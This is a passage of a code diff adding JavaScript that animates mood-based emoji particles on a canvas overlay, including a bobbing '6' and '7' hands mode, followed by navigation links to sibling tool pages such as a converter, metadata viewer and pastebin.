+function spawnEmojis(mood) {
+  const cfg = moodPresets[mood];
+  if (!cfg) return [];
+  const p = [];
+  for (let i = 0; i < cfg.count; i++) {
+    p.push({
+      emoji: cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)],
+      x: Math.random(),
+      y: Math.random(),
+      size: cfg.size[0] + Math.random() * (cfg.size[1] - cfg.size[0]),
+      vx: (Math.random() - 0.5) * cfg.sway * 0.3,
+      vy: -(cfg.speed * (0.4 + Math.random() * 0.6)),
+      phase: Math.random() * Math.PI * 2,
+      freq: 0.3 + Math.random() * 0.4,
+      sway: cfg.sway,
+      speed: cfg.speed,
+      alpha: 0.5 + Math.random() * 0.5,
+    });
+  }
+  return p;
+}
+
+document.getElementById('emojiTags').addEventListener('click', e => {
+  const btn = e.target.closest('button');
+  if (!btn) return;
+  document.querySelectorAll('#emojiTags button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  currentMood = btn.dataset.mood;
+  if (currentMood !== 'none') startEmojis();
+  else stopEmojis();
+});
+
+function startEmojis() {
+  if (emojiRunning) return;
+  const overlay = document.getElementById('emojiOverlay');
+  overlay.style.display = 'block';
+  emojiRunning = true;
+  emojiParticles = spawnEmojis(currentMood);
+  drawEmojis();
+}
+
+function stopEmojis() {
+  emojiRunning = false;
+  if (emojiRaf) { cancelAnimationFrame(emojiRaf); emojiRaf = null; }
+  const overlay = document.getElementById('emojiOverlay');
+  overlay.style.display = 'none';
+  const ctx = overlay.getContext('2d');
+  if (ctx) ctx.clearRect(0, 0, overlay.width, overlay.height);
+  emojiParticles = [];
+}
+
+const origSetFilter = setFilter;
+setFilter = function(name) {
+  origSetFilter(name);
+  if (currentMood !== 'none') startEmojis();
+};
+
+function drawEmojis() {
+  if (!emojiRunning) return;
+  const overlay = document.getElementById('emojiOverlay');
+  const parent = overlay.parentElement;
+  const pw = parent.offsetWidth, ph = parent.offsetHeight;
+  const dpr = window.devicePixelRatio || 1;
+  overlay.width = pw * dpr;
+  overlay.height = ph * dpr;
+  overlay.style.width = pw + 'px';
+  overlay.style.height = ph + 'px';
+  const ctx = overlay.getContext('2d');
+  ctx.clearRect(0, 0, overlay.width, overlay.height);
+  ctx.scale(dpr, dpr);
+
+  const cfg = moodPresets[currentMood] || moodPresets.party;
+  const now = Date.now();
+
+  if (currentMood === 'sixseven') {
+    for (const p of emojiParticles) {
+      p.x += p.vx + Math.sin(now * 0.001 * p.freq + p.phase) * p.sway * 0.005;
+      p.y += p.vy * (1 / 60);
+      if (p.y < -0.1) { p.y = 1.1; p.x = Math.random(); p.emoji = cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)]; }
+      ctx.save();
+      ctx.globalAlpha = p.alpha * 0.5;
+      ctx.font = `${p.size * 0.7}px serif`;
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(p.emoji, p.x * pw, p.y * ph);
+      ctx.restore();
+    }
+
+    const bobL = Math.sin(now * 0.006) * 12;
+    const bobR = Math.sin(now * 0.006 + Math.PI) * 12;
+    const size = Math.min(pw, ph) * 0.40;
+
+    ctx.save();
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+
+    const numSize = size * 0.55;
+    ctx.font = `${numSize}px sans-serif`;
+    ctx.shadowColor = 'rgba(255,200,50,0.5)';
+    ctx.shadowBlur = 16;
+    ctx.fillText('6️⃣', pw * 0.25, ph * 0.55 + bobL - size * 0.7);
+    ctx.fillText('7️⃣', pw * 0.75, ph * 0.55 + bobR - size * 0.7);
+
+    ctx.shadowBlur = 0;
+    ctx.font = `${size}px serif`;
+    const r = size * 0.55;
+    for (const [hx, hy] of [[pw*0.25, ph*0.55+bobL], [pw*0.75, ph*0.55+bobR]]) {
+      const grad = ctx.createRadialGradient(hx - r*0.2, hy - r*0.2, 0, hx, hy, r);
+      grad.addColorStop(0, 'rgba(255,220,150,0.25)');
+      grad.addColorStop(1, 'rgba(255,180,100,0.08)');
+      ctx.fillStyle = grad;
+      ctx.beginPath();
+      ctx.arc(hx, hy, r, 0, Math.PI * 2);
+      ctx.fill();
+    }
+    ctx.fillStyle = '#fff';
+    ctx.shadowColor = 'rgba(255,200,100,0.25)';
+    ctx.shadowBlur = 16;
+    ctx.fillText('🫲', pw * 0.25, ph * 0.55 + bobL);
+    ctx.fillText('🫱', pw * 0.75, ph * 0.55 + bobR);
+
+    ctx.restore();
+  } else {
+    for (const p of emojiParticles) {
+      p.x += p.vx + Math.sin(now * 0.001 * p.freq + p.phase) * p.sway * 0.005;
+      p.y += p.vy * (1 / 60);
+      if (p.y < -0.1) { p.y = 1.1; p.x = Math.random(); p.emoji = cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)]; }
+      const sx = p.x * pw;
+      const sy = p.y * ph;
+      ctx.save();
+      ctx.globalAlpha = p.alpha;
+      ctx.font = `${p.size}px serif`;
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.shadowColor = `hsla(0,0%,100%,${p.alpha * 0.2})`;
+      ctx.shadowBlur = 8;
+      ctx.fillText(p.emoji, sx, sy);
+      ctx.restore();
+    }
+  }
+
+  ctx.setTransform(1, 0, 0, 1, 0, 0);
+  emojiRaf = requestAnimationFrame(drawEmojis);
+}
+</script>
+<div class="nav-links">
+  <a href="convert.html">🔄 bildwerk</a>
+  <a href="metadata.html">🔍 metadaten</a>
+  <a href="ascii.html">🎨 ascii</a>
+  <a href="filedrop.html">📁 filedrop</a>
+  <a href="audio.html">🎙️ audio</a>
+  <a href="video.html">📹 video</a>
+  <a href="pastebin.html">📝 pastebin</a>
+  <a href="qr.html">📱 qr</a>
+</div>
+</body>
+</html>
